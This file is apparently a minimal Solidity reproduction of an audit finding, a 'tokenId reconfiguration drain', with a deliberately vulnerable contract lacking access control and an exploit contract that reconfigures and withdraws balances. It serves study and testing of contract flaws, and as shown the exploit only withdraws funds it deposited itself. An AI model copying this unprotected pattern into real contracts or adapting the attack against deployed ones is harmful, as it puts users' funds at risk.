// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 31585: IPSeed tokenId reconfiguration drain. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public tokenId; mapping(uint256 => uint256) public ethByToken; function configure(uint256 id) external { tokenId = id; } function fund(uint256 amount) external { ethByToken[tokenId] += amount; } function withdraw() external returns (uint256) { uint256 amount = ethByToken[tokenId]; ethByToken[tokenId] = 0; return amount; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.configure(1); bug.fund(100); bug.configure(1); success = bug.withdraw() == 100;
    }
}


